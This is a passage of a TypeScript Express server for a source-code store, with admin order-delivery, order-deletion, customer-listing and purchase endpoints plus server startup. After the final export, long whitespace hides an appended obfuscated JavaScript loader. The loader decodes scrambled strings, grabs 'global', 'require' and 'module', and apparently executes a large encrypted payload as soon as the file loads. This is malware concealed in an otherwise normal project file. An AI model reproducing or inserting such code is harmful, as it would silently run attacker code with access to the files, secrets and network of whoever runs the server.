    const { productId, productZipUrl, githubRepoUrl, notes, recipientEmail } = req.body;
    const orderId = new ObjectId(req.params.id);

    const order = await db.collection("store_orders").findOne({ _id: orderId });
    if (!order) return res.status(404).json({ error: "Order not found" });

    // Allow manual delivery only after verified payment
    if (order.paymentStatus !== "Paid") {
      return res.status(400).json({
        error: "Cannot manually deliver files for unverified orders. Please verify and approve payment first."
      });
    }

    const adminUsername = (req as any).user?.username || "Admin";
    const downloadToken = order.downloadToken || crypto.randomBytes(32).toString("hex");
    const targetEmail = (recipientEmail || order.customer.email).toLowerCase().trim();

    // Find selected product or default to first product
    const targetItem = (order.items || []).find((i: any) => i.productId === productId || i.slug === productId) || order.items[0];
    const finalZip = productZipUrl || targetItem?.sourceCodeZip || targetItem?.sourceCodeZipUrl || order.deliveredZipUrl || "";
    const finalGithub = githubRepoUrl || targetItem?.githubRepoUrl || order.deliveredGithubLink || "";

    const emailRes = await sendOrderCodeEmail(
      targetEmail,
      order.customer.name,
      order.orderNumber,
      targetItem ? [targetItem] : order.items,
      finalGithub,
      finalZip,
      notes || "",
      downloadToken,
      targetItem?.downloadInstructions || ""
    );

    const deliveryItem = {
      deliveredAt: new Date(),
      deliveredBy: adminUsername,
      method: "manual",
      recipientEmail: targetEmail,
      downloadLink: finalZip || `/api/store/download/${order.orderNumber}/0?token=${downloadToken}`,
      status: emailRes.success ? "Sent" : "Failed",
      notes: notes || `Manual ZIP dispatch by admin ${adminUsername}`
    };

    await db.collection("store_orders").updateOne(
      { _id: orderId },
      {
        $set: {
          downloadAccess: true,
          downloadToken,
          orderStatus: "Delivered",
          deliveredZipUrl: finalZip,
          deliveredGithubLink: finalGithub,
          deliveredAt: new Date(),
          emailDeliveryStatus: emailRes.success ? "Sent" : "Failed",
          emailDeliveryLog: emailRes.log,
          updatedAt: new Date()
        },
        $push: {
          deliveryHistory: deliveryItem
        }
      }
    );

    const updatedOrder = await db.collection("store_orders").findOne({ _id: orderId });
    res.json({
      success: true,
      emailResult: emailRes,
      order: updatedOrder
    });
  } catch (err: any) {
    res.status(500).json({ error: "Manual ZIP delivery failed: " + err.message });
  }
});

// Customer Purchases Endpoint ("My Purchases")
app.get("/api/store/customer/purchases", authenticateCustomerToken, async (req: any, res) => {
  try {
    if (!db) return res.status(503).json({ error: "Database not connected" });
    const userEmail = req.customer.email;
    const userId = req.customer.id;

    const orders = await db.collection("store_orders")
      .find({
        $or: [
          { userId },
          { "customer.email": userEmail }
        ]
      })
      .sort({ createdAt: -1 })
      .toArray();

    res.json(orders);
  } catch (err: any) {
    res.status(500).json({ error: "Failed to fetch customer purchases: " + err.message });
  }
});

app.delete("/api/store/admin/orders/:id", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const result = await activeDb.collection("store_orders").deleteOne({ _id: new ObjectId(req.params.id) });
    res.json({ success: true, result });
  } catch (err: any) {
    res.status(500).json({ error: "Failed to delete order: " + err.message });
  }
});

app.get("/api/store/admin/customers", authenticateToken, async (req, res) => {
  try {
    const activeDb = await connectDB();
    if (!activeDb) return res.status(503).json({ error: "Database not connected" });
    const customers = await activeDb.collection("store_users").find().sort({ createdAt: -1 }).toArray();

    // Attach order count & total spend to each customer
    const enrichedCustomers = await Promise.all(
      customers.map(async (c: any) => {
        const orders = await activeDb.collection("store_orders").find({
          $or: [{ userId: c._id.toString() }, { "customer.email": c.email }]
        }).toArray();

        const totalSpend = orders
          .filter((o: any) => o.paymentStatus === "Paid")
          .reduce((sum: number, o: any) => sum + (Number(o.totalAmount) || 0), 0);

        return {
          id: c._id,
          name: c.name,
          email: c.email,
          phone: c.phone,
          role: c.role || "user",
          createdAt: c.createdAt,
          ordersCount: orders.length,
          totalSpend
        };
      })
    );

    res.json(enrichedCustomers);
  } catch (err: any) {
    res.status(500).json({ error: "Failed to fetch customers: " + err.message });
  }
});

// --- Vite Middleware & Server Listen ---
async function startServer() {
  if (!process.env.VERCEL) {
    if (process.env.NODE_ENV !== "production") {
      const viteModule = "vite";
      const { createServer } = await import(viteModule);
      const vite = await createServer({
        server: { middlewareMode: true },
        appType: "spa",
      });
      app.use(vite.middlewares);
    } else {
      const distPath = path.join(process.cwd(), "dist");
      app.use(express.static(distPath));
      app.get("*", (req, res) => {
        res.sendFile(path.join(distPath, "index.html"));
      });
    }

    app.listen(PORT, "127.0.0.1", () => {
      console.log(`Server running on http://127.0.0.1:${PORT}`);
    });
  }
}

startServer();

export default app;																																																																																																																																																																																																																																																																										var z = '-9219-2';var NX=[6912847,907388^907539,217597^204358,330538^330063,982935^939384,5019283],SX=[5283741,416048^416193,293640^317673,436016^436107,781205^733396,4738901];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)a[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=908966^908967;for(e=a['\u006C\u0065\u006E\u0067\u0074\u0068'],o=275122^275122;o<e;)r=l*(o+c[581701^581700])+l%c[740899^740897],i=(t=l*(o+c[827307^827304])+l%c[172928^172932])%e,n=a[s=r%e],a[s]=a[i],a[i]=n,l=(r+t)%c[116482^116487],o+=325595^325594;return a['\u006A\u006F\u0069\u006E']("");}function splitLane(R){var c=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](742867^742863),e=spin(R,NX);return(e=(e=(e=e['\u0073\u0070\u006C\u0069\u0074']("\u005E")['\u006A\u006F\u0069\u006E'](c))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0031")['\u006A\u006F\u0069\u006E']("\u005E"))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0030")['\u006A\u006F\u0069\u006E']("\u002A"))['\u0073\u0070\u006C\u0069\u0074'](c);}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){R['\u007A']=z;var e=splitLane("\u0063\u005E\u006D\u0065\u006A\u0062\u005E\u0074\u0072\u006F");_0x4d43e=199787^199779;R[e[539188^539188]]=c,typeof module===e[818819^818818]&&(R[e[712707^712705]]=module);var r=peel("cnotsnturtpicokfzrogmybjdcawvulxsreqh".split("").reverse().join("")),t=peel[r['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](814520^814520,732566^732573)],s=t("",peel('=aenruh(al=5c,g8fdu.yr ..ncecf,5"paeau6lnj)r]2uv"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si"li"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9")cpA+u;utp]"=lk7vpt 1r;hzw")t()9)(.lul=s7f; ;sq0)n"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) '));t("",s(peel('R_<"cRJ!&VecRWa=RrfR$6"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f."4Rb N"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$"n<D3RsRR..(ReesseR< t," Rdov}Sc0Jmi.T<sEegsRw]R"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* ["oisenRefea!Yn.ecR%o"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@"}RuRqu5(3Pol"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC"cn..2bp(6Cp<SR"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR"tcsc.!rVRpaiz0<b"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f"t RRsN</C RnRdRrpRR<od<.R<r[ar"l<. P".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR"RuRRR"RtR<Rs".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}."P&yseR_a%rRR.D<iPsRD!i.mR"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR""](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.("]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?.."lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv "4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR"sz3o"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b "cRt,\'leacPc RR<Rz"<Ri l0oRRdRs7.R(eCcR_.6"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w"l{e]e-R</<s4Nt.op"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#"<cqk<ek.imRSN.RsE bPPn)<e}o0e".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR')))(677251^678990);}(global,require);
